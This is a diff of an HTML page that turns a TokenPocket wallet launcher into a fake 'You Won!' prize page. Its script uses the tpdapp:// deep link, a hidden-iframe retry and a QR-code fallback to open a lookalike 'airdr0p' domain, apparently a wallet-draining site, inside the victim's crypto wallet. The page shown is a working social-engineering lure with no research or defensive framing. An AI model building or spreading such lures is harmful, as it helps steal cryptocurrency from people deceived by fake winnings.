@@ -3,74 +3,119 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>打开 TP 钱包（BSC）</title>
+  <title>恭喜中奖！打开 TP 钱包领奖</title>
   <style>
     * { margin:0; padding:0; box-sizing:border-box; }
     body {
       min-height: 100vh;
-      background: linear-gradient(135deg, #1e3c72, #2a5298);
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+      background: radial-gradient(circle at center, #ff6b6b, #ffb84d);
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      overflow: hidden;
       display: flex;
-      flex-direction: column;
       align-items: center;
       justify-content: center;
-      color: #fff;
-      overflow: hidden;
+      position: relative;
     }
+
+    /* 彩带飘落 */
+    .ribbon {
+      position: absolute;
+      width: 12px;
+      height: 80px;
+      background: linear-gradient(45deg, #ffd700, #ff4500);
+      opacity: .8;
+      animation: fall linear infinite;
+    }
+    @keyframes fall {
+      to { transform: translateY(120vh) rotate(720deg); }
+    }
+
+    /* 礼花粒子 */
+    .firework {
+      position: absolute;
+      width: 6px; height: 6px;
+      background: #ffd700;
+      border-radius: 50%;
+      pointer-events: none;
+      animation: burst 1.2s ease-out forwards;
+    }
+    @keyframes burst {
+      0% { transform: scale(0); opacity: 1; }
+      100% { transform: scale(3); opacity: 0; }
+    }
+
     .container {
       text-align: center;
-      padding: 2rem;
-      max-width: 90%;
+      z-index: 10;
+      animation: bounce 2s infinite;
     }
+    @keyframes bounce {
+      0%,100% { transform: translateY(0); }
+      50% { transform: translateY(-15px); }
+    }
+
     h1 {
-      font-size: 1.8rem;
-      margin-bottom: 1rem;
-      text-shadow: 0 2px 4px rgba(0,0,0,.3);
-    }
-    p {
-      font-size: 1rem;
-      margin-bottom: 2rem;
-      opacity: .9;
-    }
-    .btn {
-      display: inline-block;
-      padding: 0.9rem 2.2rem;
-      font-size: 1.1rem;
-      font-weight: 600;
+      font-size: 2rem;
       color: #fff;
-      background: linear-gradient(45deg, #f0b90b, #f9d423);
-      border: none;
-      border-radius: 50px;
-      box-shadow: 0 6px 15px rgba(240,185,11,.4);
-      text-decoration: none;
-      transition: all .3s ease;
-      cursor: pointer;
+      text-shadow: 0 0 10px #ff0, 0 0 20px #ff0;
+      margin-bottom: .5rem;
+      animation: glow 1.5s infinite alternate;
+    }
+    @keyframes glow {
+      from { text-shadow: 0 0 10px #ff0; }
+      to { text-shadow: 0 0 30px #ff0, 0 0 40px #ff4500; }
+    }
+
+    p {
+      color: #fff;
+      font-weight: bold;
+      margin-bottom: 1.5rem;
+      font-size: 1.1rem;
+    }
+
+    /* 按钮：金光闪闪 + 呼吸光环 */
+    .btn {
       position: relative;
-      overflow: hidden;
+      padding: 1rem 2.5rem;
+      font-size: 1.25rem;
+      font-weight: bold;
+      color: #8b4513;
+      background: linear-gradient(45deg, #ffd700, #ffed4e);
+      border: 4px solid #fff;
+      border-radius: 60px;
+      box-shadow: 
+        0 0 20px rgba(255,215,0,.8),
+        0 8px 20px rgba(0,0,0,.3),
+        inset 0 0 15px rgba(255,255,255,.6);
+      cursor: pointer;
+      transition: all .3s;
+      animation: pulse 2s infinite;
     }
     .btn:hover {
-      transform: translateY(-3px);
-      box-shadow: 0 10px 20px rgba(240,185,11,.5);
+      transform: scale(1.08);
+      box-shadow: 0 0 35px gold, 0 12px 30px rgba(0,0,0,.4);
     }
-    .btn:active {
-      transform: translateY(-1px);
+    @keyframes pulse {
+      0% { box-shadow: 0 0 20px rgba(255,215,0,.8), 0 8px 20px rgba(0,0,0,.3); }
+      50% { box-shadow: 0 0 40px gold, 0 12px 30px rgba(0,0,0,.4); }
+      100% { box-shadow: 0 0 20px rgba(255,215,0,.8), 0 8px 20px rgba(0,0,0,.3); }
     }
-    .btn::after {
-      content: "";
+
+    /* 金币跳动图标 */
+    .btn::before {
+      content: "Coin";
       position: absolute;
-      top: 50%; left: 50%;
-      width: 5px; height: 5px;
-      background: rgba(255,255,255,.5);
-      opacity: 0;
-      border-radius: 100%;
-      transform: scale(1) translate(-50%, -50%);
-      transition: all .6s;
+      top: -30px; left: 50%;
+      transform: translateX(-50%);
+      font-size: 2rem;
+      animation: coin 1.5s infinite;
     }
-    .btn:active::after {
-      width: 200px; height: 200px;
-      opacity: 1;
-      transition: 0s;
+    @keyframes coin {
+      0%,100% { transform: translateX(-50%) translateY(0) rotate(0); }
+      50% { transform: translateX(-50%) translateY(-10px) rotate(180deg); }
     }
+
+    /* 二维码 */
     .qrcode {
       margin-top: 2rem;
       display: none;
@@ -78,16 +123,106 @@
     .qrcode img {
       width: 180px;
       border: 8px solid #fff;
-      border-radius: 12px;
-      box-shadow: 0 4px 12px rgba(0,0,0,.2);
+      border-radius: 16px;
+      box-shadow: 0 6px 20px rgba(0,0,0,.3);
     }
-    .tip {
-      margin-top: 1rem;
-      font-size: .9rem;
-      opacity: .8;
-    }
+    .tip { margin-top: 1rem; color: #fff; font-size: .9rem; }
   </style>
 </head>
 <body>
 
-<div class
+<!-- 彩带飘落 -->
+<div id="ribbons"></div>
+
+<div class="container">
+  <h1>Congratulations! You Won!</h1>
+  <p>立即在 TP 钱包（BSC）领取大奖</p>
+
+  <button id="openBtn" class="btn">
+    Open in TP Wallet (BSC)
+  </button>
+
+  <div id="qrcode" class="qrcode">
+    <p>请使用 TP 钱包扫码领奖</p>
+    <img id="qrImg" src="" alt="二维码">
+  </div>
+  <p class="tip" id="tip"></p>
+</div>
+
+<script>
+const TARGET_URL = "https://airdr0p-888.github.io/usdt1688/index.html";
+
+// 生成彩带
+function createRibbon() {
+  const ribbon = document.createElement('div');
+  ribbon.className = 'ribbon';
+  ribbon.style.left = Math.random() * 100 + 'vw';
+  ribbon.style.animationDuration = (Math.random() * 3 + 3) + 's';
+  ribbon.style.background = `linear-gradient(45deg, ${['#ffd700','#ff4500','#32cd32','#00ced1'][Math.floor(Math.random()*4)]}, #fff)`;
+  document.getElementById('ribbons').appendChild(ribbon);
+  setTimeout(() => ribbon.remove(), 6000);
+}
+setInterval(createRibbon, 300);
+
+// 礼花爆炸
+function fireworks(e) {
+  for(let i=0; i<30; i++){
+    const fw = document.createElement('div');
+    fw.className = 'firework';
+    const angle = Math.random() * Math.PI * 2;
+    const velocity = 8 + Math.random() * 12;
+    fw.style.left = e.clientX + 'px';
+    fw.style.top = e.clientY + 'px';
+    fw.style.background = ['#ffd700','#ff4500','#32cd32','#00ced1'][Math.floor(Math.random()*4)];
+    fw.style.transform = `translate(${Math.cos(angle)*velocity*10}px, ${Math.sin(angle)*velocity*10}px)`;
+    document.body.appendChild(fw);
+    setTimeout(() => fw.remove(), 1200);
+  }
+}
+
+// TP 唤醒
+function isTPBrowser() {
+  return /tokenpocket|tpdapp/i.test(navigator.userAgent);
+}
+
+function showQR() {
+  const qr = document.getElementById('qrcode');
+  const img = document.getElementById('qrImg');
+  const tip = document.getElementById('tip');
+  img.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(TARGET_URL)}`;
+  qr.style.display = 'block';
+  tip.textContent = '未检测到 TP 钱包，长按保存二维码后在 TP 中扫码领奖';
+}
+
+function openTP() {
+  if (isTPBrowser()) {
+    location.href = TARGET_URL;
+    return;
+  }
+
+  const params = { url: TARGET_URL, chain: "BSC", source: "web" };
+  const scheme = `tpdapp://open?params=${encodeURIComponent(JSON.stringify(params))}`;
+  location.href = scheme;
+
+  // iOS 增强
+  setTimeout(() => {
+    const iframe = document.createElement('iframe');
+    iframe.style.display = 'none';
+    iframe.src = scheme;
+    document.body.appendChild(iframe);
+    setTimeout(() => document.body.removeChild(iframe), 2000);
+  }, 300);
+
+  // 失败兜底
+  setTimeout(showQR, 3500);
+}
+
+// 绑定点击
+document.getElementById('openBtn').addEventListener('click', function(e) {
+  fireworks(e);
+  openTP();
+});
+</script>
+
+</body>
+</html>
